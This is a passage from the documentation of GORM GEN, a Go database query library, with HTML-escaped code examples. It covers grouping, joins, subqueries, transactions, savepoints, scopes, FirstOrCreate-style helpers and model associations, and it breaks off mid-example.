Name  string&#xA;    Total int&#xA;}&#xA;err := u.WithContext(ctx).Select(u.Name, u.ID.Count().As(&#34;total&#34;)).Group(u.Name).Scan(&amp;amp;users)&#xA;// SELECT name, count(id) as total FROM `users` GROUP BY `name`&#xA;&#xA;err := u.WithContext(ctx).Select(u.Name, u.Age.Sum().As(&#34;total&#34;)).Where(u.Name.Like(&#34;%modi%&#34;)).Group(u.Name).Scan(&amp;amp;users)&#xA;// SELECT name, sum(age) as total FROM `users` WHERE name LIKE &#34;%modi%&#34; GROUP BY `name`&#xA;&#xA;err := u.WithContext(ctx).Select(u.Name, u.Age.Sum().As(&#34;total&#34;)).Group(u.Name).Having(u.Name.Eq(&#34;group&#34;)).Scan(&amp;amp;users)&#xA;// SELECT name, sum(age) as total FROM `users` GROUP BY `name` HAVING name = &#34;group&#34;&#xA;&#xA;rows, err := u.WithContext(ctx).Select(u.Birthday.As(&#34;date&#34;), u.Age.Sum().As(&#34;total&#34;)).Group(u.Birthday).Rows()&#xA;for rows.Next() {&#xA;  ...&#xA;}&#xA;&#xA;o := query.Use(db).Order&#xA;&#xA;rows, err := o.WithContext(ctx).Select(o.CreateAt.Date().As(&#34;date&#34;), o.Amount.Sum().As(&#34;total&#34;)).Group(o.CreateAt.Date()).Having(u.Amount.Sum().Gt(100)).Rows()&#xA;for rows.Next() {&#xA;  ...&#xA;}&#xA;&#xA;var results []struct {&#xA;    Date  time.Time&#xA;    Total int&#xA;}&#xA;&#xA;o.WithContext(ctx).Select(o.CreateAt.Date().As(&#34;date&#34;), o.WithContext(ctx).Amount.Sum().As(&#34;total&#34;)).Group(o.CreateAt.Date()).Having(u.Amount.Sum().Gt(100)).Scan(&amp;amp;results)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Distinct&lt;/h6&gt; &#xA;&lt;p&gt;Selecting distinct values from the model&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;users, err := u.WithContext(ctx).Distinct(u.Name, u.Age).Order(u.Name, u.Age.Desc()).Find()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;Distinct&lt;/code&gt; works with &lt;code&gt;Pluck&lt;/code&gt; and &lt;code&gt;Count&lt;/code&gt; too&lt;/p&gt; &#xA;&lt;h6&gt;Joins&lt;/h6&gt; &#xA;&lt;p&gt;Specify Joins conditions&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;q := query.Use(db)&#xA;u := q.User&#xA;e := q.Email&#xA;c := q.CreditCard&#xA;&#xA;type Result struct {&#xA;    Name  string&#xA;    Email string&#xA;    ID    int64&#xA;}&#xA;&#xA;var result Result&#xA;&#xA;err := u.WithContext(ctx).Select(u.Name, e.Email).LeftJoin(e, e.UserID.EqCol(u.ID)).Scan(&amp;amp;result)&#xA;// SELECT users.name, emails.email FROM `users` left join emails on emails.user_id = users.id&#xA;&#xA;// self join&#xA;var result Result&#xA;u2 := u.As(&#34;u2&#34;)&#xA;err := u.WithContext(ctx).Select(u.Name, u2.ID).LeftJoin(u2, u2.ID.EqCol(u.ID)).Scan(&amp;amp;result)&#xA;// SELECT users.name, u2.id FROM `users` left join `users` u2 on u2.id = users.id&#xA;&#xA;//join with sub query&#xA;var result Result&#xA;e2 := e.As(&#34;e2&#34;)&#xA;err := u.WithContext(ctx).Select(u.Name, e2.Email).LeftJoin(e.WithContext(ctx).Select(e.Email, e.UserID).Where(e.UserID.Gt(100)).As(&#34;e2&#34;), e2.UserID.EqCol(u.ID)).Scan(&amp;amp;result)&#xA;// SELECT users.name, e2.email FROM `users` left join (select email,user_id from emails  where user_id &amp;gt; 100) as e2 on e2.user_id = users.id&#xA;&#xA;rows, err := u.WithContext(ctx).Select(u.Name, e.Email).LeftJoin(e, e.UserID.EqCol(u.ID)).Rows()&#xA;for rows.Next() {&#xA;  ...&#xA;}&#xA;&#xA;var results []Result&#xA;&#xA;err := u.WithContext(ctx).Select(u.Name, e.Email).LeftJoin(e, e.UserID.EqCol(u.ID)).Scan(&amp;amp;results)&#xA;&#xA;// multiple joins with parameter&#xA;users := u.WithContext(ctx).Join(e, e.UserID.EqCol(u.id), e.Email.Eq(&#34;modi@example.org&#34;)).Join(c, c.UserID.EqCol(u.ID)).Where(c.Number.Eq(&#34;411111111111&#34;)).Find()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;SubQuery&lt;/h5&gt; &#xA;&lt;p&gt;A subquery can be nested within a query, GEN can generate subquery when using a &lt;code&gt;Dao&lt;/code&gt; object as param&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;o := query.Use(db).Order&#xA;u := query.Use(db).User&#xA;&#xA;orders, err := o.WithContext(ctx).Where(o.WithContext(ctx).Columns(o.Amount).Gt(o.WithContext(ctx).Select(o.Amount.Avg())).Find()&#xA;// SELECT * FROM &#34;orders&#34; WHERE amount &amp;gt; (SELECT AVG(amount) FROM &#34;orders&#34;);&#xA;&#xA;subQuery := u.WithContext(ctx).Select(u.Age.Avg()).Where(u.Name.Like(&#34;name%&#34;))&#xA;users, err := u.WithContext(ctx).Select(u.Age.Avg().As(&#34;avgage&#34;)).Group(u.Name).Having(u.WithContext(ctx).Columns(u.Age.Avg()).Gt(subQuery).Find()&#xA;// SELECT AVG(age) as avgage FROM `users` GROUP BY `name` HAVING AVG(age) &amp;gt; (SELECT AVG(age) FROM `users` WHERE name LIKE &#34;name%&#34;)&#xA;&#xA;// Select users with orders between 100 and 200&#xA;subQuery1 := o.WithContext(ctx).Select(o.ID).Where(o.UserID.EqCol(u.ID), o.Amount.Gt(100))&#xA;subQuery2 := o.WithContext(ctx).Select(o.ID).Where(o.UserID.EqCol(u.ID), o.Amount.Gt(200))&#xA;u.WithContext(ctx).Exists(subQuery1).Not(u.WithContext(ctx).Exists(subQuery2)).Find()&#xA;// SELECT * FROM `users` WHERE EXISTS (SELECT `orders`.`id` FROM `orders` WHERE `orders`.`user_id` = `users`.`id` AND `orders`.`amount` &amp;gt; 100 AND `orders`.`deleted_at` IS NULL) AND NOT EXISTS (SELECT `orders`.`id` FROM `orders` WHERE `orders`.`user_id` = `users`.`id` AND `orders`.`amount` &amp;gt; 200 AND `orders`.`deleted_at` IS NULL) AND `users`.`deleted_at` IS NULL&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;From SubQuery&lt;/h6&gt; &#xA;&lt;p&gt;GORM allows you using subquery in FROM clause with method &lt;code&gt;Table&lt;/code&gt;, for example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;p := query.Use(db).Pet&#xA;&#xA;users, err := gen.Table(u.WithContext(ctx).Select(u.Name, u.Age).As(&#34;u&#34;)).Where(u.Age.Eq(18)).Find()&#xA;// SELECT * FROM (SELECT `name`,`age` FROM `users`) as u WHERE `age` = 18&#xA;&#xA;subQuery1 := u.WithContext(ctx).Select(u.Name)&#xA;subQuery2 := p.WithContext(ctx).Select(p.Name)&#xA;users, err := gen.Table(subQuery1.As(&#34;u&#34;), subQuery2.As(&#34;p&#34;)).Find()&#xA;db.Table(&#34;(?) as u, (?) as p&#34;, subQuery1, subQuery2).Find(&amp;amp;User{})&#xA;// SELECT * FROM (SELECT `name` FROM `users`) as u, (SELECT `name` FROM `pets`) as p&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Update from SubQuery&lt;/h6&gt; &#xA;&lt;p&gt;Update a table by using SubQuery&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;c := query.Use(db).Company&#xA;&#xA;u.WithContext(ctx).Update(u.CompanyName, c.Select(c.Name).Where(c.ID.EqCol(u.CompanyID)))&#xA;// UPDATE &#34;users&#34; SET &#34;company_name&#34; = (SELECT name FROM companies WHERE companies.id = users.company_id);&#xA;&#xA;u.WithContext(ctx).Where(u.Name.Eq(&#34;modi&#34;)).Update(u.CompanyName, c.Select(c.Name).Where(c.ID.EqCol(u.CompanyID)))&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Update multiple columns from SubQuery&lt;/h6&gt; &#xA;&lt;p&gt;Update multiple columns by using SubQuery (for MySQL):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;c := query.Use(db).Company&#xA;&#xA;ua := u.As(&#34;u&#34;)&#xA;ca := u.As(&#34;c&#34;)&#xA;&#xA;ua.WithContext(ctx).UpdateFrom(ca.WithContext(ctx).Select(c.ID, c.Address, c.Phone).Where(c.ID.Gt(100))).&#xA;Where(ua.CompanyID.EqCol(ca.ID)).&#xA;UpdateSimple(&#xA;  ua.Address.SetCol(ca.Address),&#xA;  ua.Phone.SetCol(ca.Phone),&#xA;)&#xA;// UPDATE `users` AS `u`,(&#xA;//   SELECT `company`.`id`,`company`.`address`,`company`.`phone` &#xA;//   FROM `company` WHERE `company`.`id` &amp;gt; 100 AND `company`.`deleted_at` IS NULL&#xA;// ) AS `c` &#xA;// SET `u`.`address`=`c`.`address`,`c`.`phone`=`c`.`phone`,`updated_at`=&#39;2021-11-11 11:11:11.111&#39;&#xA;// WHERE `u`.`company_id` = `c`.`id`&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Transaction&lt;/h5&gt; &#xA;&lt;p&gt;To perform a set of operations within a transaction, the general flow is as below.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;q := query.Use(db)&#xA;&#xA;q.Transaction(func(tx *query.Query) error {&#xA;  if _, err := tx.User.WithContext(ctx).Where(tx.User.ID.Eq(100)).Delete(); err != nil {&#xA;    return err&#xA;  }&#xA;  if _, err := tx.Article.WithContext(ctx).Create(&amp;amp;model.User{Name:&#34;modi&#34;}); err != nil {&#xA;    return err&#xA;  }&#xA;  return nil&#xA;})&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Nested Transactions&lt;/h6&gt; &#xA;&lt;p&gt;GEN supports nested transactions, you can rollback a subset of operations performed within the scope of a larger transaction, for example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;q := query.Use(db)&#xA;&#xA;q.Transaction(func(tx *query.Query) error {&#xA;  tx.User.WithContext(ctx).Create(&amp;amp;user1)&#xA;&#xA;  tx.Transaction(func(tx2 *query.Query) error {&#xA;    tx2.User.WithContext(ctx).Create(&amp;amp;user2)&#xA;    return errors.New(&#34;rollback user2&#34;) // Rollback user2&#xA;  })&#xA;&#xA;  tx.Transaction(func(tx2 *query.Query) error {&#xA;    tx2.User.WithContext(ctx).Create(&amp;amp;user3)&#xA;    return nil&#xA;  })&#xA;&#xA;  return nil&#xA;})&#xA;&#xA;// Commit user1, user3&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Transactions by manual&lt;/h6&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;q := query.Use(db)&#xA;&#xA;// begin a transaction&#xA;tx := q.Begin()&#xA;&#xA;// do some database operations in the transaction (use &#39;tx&#39; from this point, not &#39;db&#39;)&#xA;tx.User.WithContext(ctx).Create(...)&#xA;&#xA;// ...&#xA;&#xA;// rollback the transaction in case of error&#xA;tx.Rollback()&#xA;&#xA;// Or commit the transaction&#xA;tx.Commit()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;q := query.Use(db)&#xA;&#xA;func doSomething(ctx context.Context, users ...*model.User) (err error) {&#xA;    tx := q.Begin()&#xA;    defer func() {&#xA;        if recover() != nil || err != nil {&#xA;            _ = tx.Rollback()&#xA;        }&#xA;    }()&#xA;&#xA;    err = tx.User.WithContext(ctx).Create(users...)&#xA;    if err != nil {&#xA;        return&#xA;    }&#xA;    return tx.Commit()&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;SavePoint/RollbackTo&lt;/h6&gt; &#xA;&lt;p&gt;GEN provides &lt;code&gt;SavePoint&lt;/code&gt;, &lt;code&gt;RollbackTo&lt;/code&gt; to save points and roll back to a savepoint, for example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;tx := q.Begin()&#xA;txCtx = tx.WithContext(ctx)&#xA;&#xA;txCtx.User.Create(&amp;amp;user1)&#xA;&#xA;tx.SavePoint(&#34;sp1&#34;)&#xA;txCtx.Create(&amp;amp;user2)&#xA;tx.RollbackTo(&#34;sp1&#34;) // Rollback user2&#xA;&#xA;tx.Commit() // Commit user1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Advanced Query&lt;/h5&gt; &#xA;&lt;h6&gt;Iteration&lt;/h6&gt; &#xA;&lt;p&gt;GEN supports iterating through Rows&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;do := u.WithContext(ctx)&#xA;rows, err := do.Where(u.Name.Eq(&#34;modi&#34;)).Rows()&#xA;defer rows.Close()&#xA;&#xA;for rows.Next() {&#xA;    var user User&#xA;    // ScanRows is a method of `gorm.DB`, it can be used to scan a row into a struct&#xA;    do.ScanRows(rows, &amp;amp;user)&#xA;&#xA;    // do something&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;FindInBatches&lt;/h6&gt; &#xA;&lt;p&gt;Query and process records in batch&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;// batch size 100&#xA;err := u.WithContext(ctx).Where(u.ID.Gt(9)).FindInBatches(&amp;amp;results, 100, func(tx gen.Dao, batch int) error {&#xA;    for _, result := range results {&#xA;      // batch processing found records&#xA;    }&#xA;  &#xA;    // build a new `u` to use it&#39;s api&#xA;    // queryUsery := query.NewUser(tx.UnderlyingDB())&#xA;&#xA;    tx.Save(&amp;amp;results)&#xA;&#xA;    batch // Batch 1, 2, 3&#xA;&#xA;    // returns error will stop future batches&#xA;    return nil&#xA;})&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Pluck&lt;/h6&gt; &#xA;&lt;p&gt;Query single column from database and scan into a slice, if you want to query multiple columns, use &lt;code&gt;Select&lt;/code&gt; with &lt;code&gt;Scan&lt;/code&gt; instead&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;var ages []int64&#xA;u.WithContext(ctx).Pluck(u.Age, &amp;amp;ages)&#xA;&#xA;var names []string&#xA;u.WithContext(ctx).Pluck(u.Name, &amp;amp;names)&#xA;&#xA;// Distinct Pluck&#xA;u.WithContext(ctx).Distinct().Pluck(u.Name, &amp;amp;names)&#xA;// SELECT DISTINCT `name` FROM `users`&#xA;&#xA;// Requesting more than one column, use `Scan` or `Find` like this:&#xA;db.WithContext(ctx).Select(u.Name, u.Age).Scan(&amp;amp;users)&#xA;users, err := db.Select(u.Name, u.Age).Find()&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Scopes&lt;/h6&gt; &#xA;&lt;p&gt;&lt;code&gt;Scopes&lt;/code&gt; allows you to specify commonly-used queries which can be referenced as method calls&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;o := query.Use(db).Order&#xA;&#xA;func AmountGreaterThan1000(tx gen.Dao) gen.Dao {&#xA;    return tx.Where(o.Amount.Gt(1000))&#xA;}&#xA;&#xA;func PaidWithCreditCard(tx gen.Dao) gen.Dao {&#xA;    return tx.Where(o.PayModeSign.Eq(&#34;C&#34;))&#xA;}&#xA;&#xA;func PaidWithCod(tx gen.Dao) gen.Dao {&#xA;    return tx.Where(o.PayModeSign.Eq(&#34;C&#34;))&#xA;}&#xA;&#xA;func OrderStatus(status []string) func (tx gen.Dao) gen.Dao {&#xA;    return func (tx gen.Dao) gen.Dao {&#xA;      return tx.Where(o.Status.In(status...))&#xA;    }&#xA;}&#xA;&#xA;orders, err := o.WithContext(ctx).Scopes(AmountGreaterThan1000, PaidWithCreditCard).Find()&#xA;// Find all credit card orders and amount greater than 1000&#xA;&#xA;orders, err := o.WithContext(ctx).Scopes(AmountGreaterThan1000, PaidWithCod).Find()&#xA;// Find all COD orders and amount greater than 1000&#xA;&#xA;orders, err := o.WithContext(ctx).Scopes(AmountGreaterThan1000, OrderStatus([]string{&#34;paid&#34;, &#34;shipped&#34;})).Find()&#xA;// Find all paid, shipped orders that amount greater than 1000&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Count&lt;/h6&gt; &#xA;&lt;p&gt;Get matched records count&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;count, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;modi&#34;)).Or(u.Name.Eq(&#34;zhangqiang&#34;)).Count()&#xA;// SELECT count(1) FROM users WHERE name = &#39;modi&#39; OR name = &#39;zhangqiang&#39;&#xA;&#xA;count, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;modi&#34;)).Count()&#xA;// SELECT count(1) FROM users WHERE name = &#39;modi&#39;; (count)&#xA;&#xA;// Count with Distinct&#xA;u.WithContext(ctx).Distinct(u.Name).Count()&#xA;// SELECT COUNT(DISTINCT(`name`)) FROM `users`&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;FirstOrInit&lt;/h6&gt; &#xA;&lt;p&gt;Get first matched record or initialize a new instance with given conditions&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;// User not found, initialize it with give conditions&#xA;user, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;non_existing&#34;)).FirstOrInit()&#xA;// user -&amp;gt; User{Name: &#34;non_existing&#34;}&#xA;&#xA;// Found user with `name` = `modi`&#xA;user, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;modi&#34;)).FirstOrInit()&#xA;// user -&amp;gt; User{ID: 1, Name: &#34;modi&#34;, Age: 17}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;initialize struct with more attributes if record not found, those &lt;code&gt;Attrs&lt;/code&gt; won’t be used to build SQL query&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;// User not found, initialize it with give conditions and Attrs&#xA;user, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;non_existing&#34;)).Attrs(u.Age.Value(20)).FirstOrInit()&#xA;// SELECT * FROM USERS WHERE name = &#39;non_existing&#39; ORDER BY id LIMIT 1;&#xA;// user -&amp;gt; User{Name: &#34;non_existing&#34;, Age: 20}&#xA;&#xA;// User not found, initialize it with give conditions and Attrs&#xA;user, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;non_existing&#34;)).Attrs(u.Age.Value(20)).FirstOrInit()&#xA;// SELECT * FROM USERS WHERE name = &#39;non_existing&#39; ORDER BY id LIMIT 1;&#xA;// user -&amp;gt; User{Name: &#34;non_existing&#34;, Age: 20}&#xA;&#xA;// Found user with `name` = `modi`, attributes will be ignored&#xA;user, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;modi&#34;)).Attrs(u.Age.Value(20)).FirstOrInit()&#xA;// SELECT * FROM USERS WHERE name = modi&#39; ORDER BY id LIMIT 1;&#xA;// user -&amp;gt; User{ID: 1, Name: &#34;modi&#34;, Age: 17}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;Assign&lt;/code&gt; attributes to struct regardless it is found or not, those attributes won’t be used to build SQL query and the final data won’t be saved into database&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// User not found, initialize it with give conditions and Assign attributes&#xA;user, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;non_existing&#34;)).Assign(u.Age.Value(20)).FirstOrInit()&#xA;// user -&amp;gt; User{Name: &#34;non_existing&#34;, Age: 20}&#xA;&#xA;// Found user with `name` = `modi`, update it with Assign attributes&#xA;user, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;modi&#34;)).Assign(u.Age.Value(20)).FirstOrInit()&#xA;// SELECT * FROM USERS WHERE name = modi&#39; ORDER BY id LIMIT 1;&#xA;// user -&amp;gt; User{ID: 111, Name: &#34;modi&#34;, Age: 20}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;FirstOrCreate&lt;/h6&gt; &#xA;&lt;p&gt;Get first matched record or create a new one with given conditions&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;// User not found, create a new record with give conditions&#xA;user, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;non_existing&#34;)).FirstOrCreate()&#xA;// INSERT INTO &#34;users&#34; (name) VALUES (&#34;non_existing&#34;);&#xA;// user -&amp;gt; User{ID: 112, Name: &#34;non_existing&#34;}&#xA;&#xA;// Found user with `name` = `modi`&#xA;user, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;modi&#34;)).FirstOrCreate()&#xA;// user -&amp;gt; User{ID: 111, Name: &#34;modi&#34;, &#34;Age&#34;: 18}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Create struct with more attributes if record not found, those &lt;code&gt;Attrs&lt;/code&gt; won’t be used to build SQL query&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;// User not found, create it with give conditions and Attrs&#xA;user, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;non_existing&#34;)).Attrs(u.Age.Value(20)).FirstOrCreate()&#xA;// SELECT * FROM users WHERE name = &#39;non_existing&#39; ORDER BY id LIMIT 1;&#xA;// INSERT INTO &#34;users&#34; (name, age) VALUES (&#34;non_existing&#34;, 20);&#xA;// user -&amp;gt; User{ID: 112, Name: &#34;non_existing&#34;, Age: 20}&#xA;&#xA;// Found user with `name` = `modi`, attributes will be ignored&#xA;user, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;modi&#34;)).Attrs(u.Age.Value(20)).FirstOrCreate()&#xA;// SELECT * FROM users WHERE name = &#39;modi&#39; ORDER BY id LIMIT 1;&#xA;// user -&amp;gt; User{ID: 111, Name: &#34;modi&#34;, Age: 18}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;Assign&lt;/code&gt; attributes to the record regardless it is found or not and save them back to the database.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;u := query.Use(db).User&#xA;&#xA;// User not found, initialize it with give conditions and Assign attributes&#xA;user, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;non_existing&#34;)).Assign(u.Age.Value(20)).FirstOrCreate()&#xA;// SELECT * FROM users WHERE name = &#39;non_existing&#39; ORDER BY id LIMIT 1;&#xA;// INSERT INTO &#34;users&#34; (name, age) VALUES (&#34;non_existing&#34;, 20);&#xA;// user -&amp;gt; User{ID: 112, Name: &#34;non_existing&#34;, Age: 20}&#xA;&#xA;// Found user with `name` = `modi`, update it with Assign attributes&#xA;user, err := u.WithContext(ctx).Where(u.Name.Eq(&#34;modi&#34;)).Assign(u.Age.Value(20)).FirstOrCreate(&amp;amp;user)&#xA;// SELECT * FROM users WHERE name = &#39;modi&#39; ORDER BY id LIMIT 1;&#xA;// UPDATE users SET age=20 WHERE id = 111;&#xA;// user -&amp;gt; User{ID: 111, Name: &#34;modi&#34;, Age: 20}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Association&lt;/h4&gt; &#xA;&lt;p&gt;GEN will auto-save associations as GORM do. The relationships (BelongsTo/HasOne/HasMany/Many2Many) reuse GORM&#39;s tag. This feature only support exist model for now.&lt;/p&gt; &#xA;&lt;h5&gt;Relation&lt;/h5&gt; &#xA;&lt;p&gt;There are 4 kind of relationship.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;const (&#xA;    HasOne    RelationshipType = RelationshipType(schema.HasOne)    // HasOneRel has one relationship&#xA;    HasMany   RelationshipType = RelationshipType(schema.HasMany)   // HasManyRel has many relationships&#xA;    BelongsTo RelationshipType = RelationshipType(schema.BelongsTo) // BelongsToRel belongs to relationship&#xA;    Many2Many RelationshipType = RelationshipType(schema.Many2Many) // Many2ManyRel many to many relationship&#xA;)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Relate to exist model&lt;/h6&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;package model&#xA;&#xA;// exist model&#xA;type Customer struct {&#xA;    gorm.Model&#xA;    CreditCards []CreditCard `gorm:&#34;foreignKey:CustomerRefer&#34;`&#xA;}&#xA;&#xA;type CreditCard struct {&#xA;    gorm.Model&#xA;    Number        string&#xA;    CustomerRefer uint&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;GEN will detect model&#39;s associations:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// specify model&#xA;g.ApplyBasic(model.Customer{}, model.CreditCard{})&#xA;&#xA;// assoications will be detected and converted to code &#xA;package query&#xA;&#xA;type customer struct {&#xA;    ...&#xA;    CreditCards customerHasManyCreditCards&#xA;}&#xA;&#xA;type creditCard struct{&#xA;    ...&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Relate to table in database&lt;/h6&gt; &#xA;&lt;p&gt;The association have to be speified by &lt;code&gt;gen.FieldRelate&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;card := g.GenerateModel(&#34;credit_cards&#34;)&#xA;customer := g.GenerateModel(&#34;customers&#34;, gen.FieldRelate(field.HasMany, &#34;CreditCards&#34;, b, &#xA;    &amp;amp;field.RelateConfig{&#xA;        // RelateSlice: true,&#xA;        GORMTag: &#34;foreignKey:CustomerRefer&#34;,&#xA;    }),&#xA;)&#xA;&#xA;g.ApplyBasic(card, custormer)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;GEN will generate models with associated field:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// customers&#xA;type Customer struct {&#xA;    ID          int64          `gorm:&#34;column:id;type:bigint(20) unsigned;primaryKey&#34; json:&#34;id&#34;`&#xA;    CreatedAt   time.Time      `gorm:&#34;column:created_at;type:datetime(3)&#34; json:&#34;created_at&#34;`&#xA;    UpdatedAt   time.Time      `gorm:&#34;column:updated_at;type:datetime(3)&#34; json:&#34;updated_at&#34;`&#xA;    DeletedAt   gorm.DeletedAt `gorm:&#34;column:deleted_at;type:datetime(3)&#34; json:&#34;deleted_at&#34;`&#xA;    CreditCards []CreditCard   `gorm:&#34;foreignKey:CustomerRefer&#34; json:&#34;credit_cards&#34;`&#xA;}&#xA;&#xA;&#xA;// credit_cards&#xA;type CreditCard struct {&#xA;    ID            int64          `gorm:&#34;column:id;type:bigint(20) unsigned;primaryKey&#34; json:&#34;id&#34;`&#xA;    CreatedAt     time.Time      `gorm:&#34;column:created_at;type:datetime(3)&#34; json:&#34;created_at&#34;`&#xA;    UpdatedAt     time.Time      `gorm:&#34;column:updated_at;type:datetime(3)&#34; json:&#34;updated_at&#34;`&#xA;    DeletedAt     gorm.DeletedAt `gorm:&#34;column:deleted_at;type:datetime(3)&#34; json:&#34;deleted_at&#34;`&#xA;    CustomerRefer int64          `gorm:&#34;column:customer_refer;type:bigint(20) unsigned&#34; json:&#34;customer_refer&#34;`&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If associated model already exists, &lt;code&gt;gen.FieldRelateModel&lt;/code&gt; can help you build associations between them.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;customer := g.GenerateModel(&#34;customers&#34;, gen.FieldRelateModel(field.HasMany, &#34;CreditCards&#34;, model.CreditCard{}, &#xA;    &amp;amp;field.RelateConfig{&#xA;        // RelateSlice: true,&#xA;        GORMTag: &#34;foreignKey:CustomerRefer&#34;,&#xA;    }),&#xA;)&#xA;&#xA;g.ApplyBasic(custormer)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h6&gt;Relate Config&lt;/h6&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type RelateConfig struct {&#xA;    // specify field&#39;s type&#xA;    RelatePointer      bool // ex: CreditCard  *CreditCard&#xA;    RelateSlice        bool // ex: CreditCards []CreditCard&#xA;    RelateSlicePointer bool // ex: CreditCards []*CreditCard&#xA;&#xA;    JSONTag      string // related field&#39;s JSON tag&#xA;    GORMTag      string // related field&#39;s GORM tag&#xA;    NewTag       string // related field&#39;s new tag&#xA;    OverwriteTag string // related field&#39;s tag&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Operation&lt;/h5&gt; &#xA;&lt;h6&gt;Skip Auto Create/Update&lt;/h6&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;user := model.User{&#xA;  Name:            &#34;modi&#34;,&#xA;  BillingAddress:  